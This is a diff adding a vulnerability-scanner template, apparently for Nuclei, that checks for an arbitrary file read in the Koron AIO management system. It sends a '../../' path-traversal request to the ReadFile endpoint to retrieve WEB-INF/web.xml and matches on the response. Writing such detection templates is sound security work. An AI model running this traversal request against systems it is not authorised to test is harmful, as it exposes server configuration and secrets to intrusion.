@@ -1,0 +1,21 @@
+id: poc-yaml-koron-aio-readfile-anyfile-read
+info:
+  name: 科荣 AIO管理系统 ReadFile 任意文件读取漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/ReadFile?tempFile=path&path=../../website/WEB-INF/&fileName=web.xml"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<web-app"
+          - "<filter>"
+          - "java.sun.com"
+        part: body
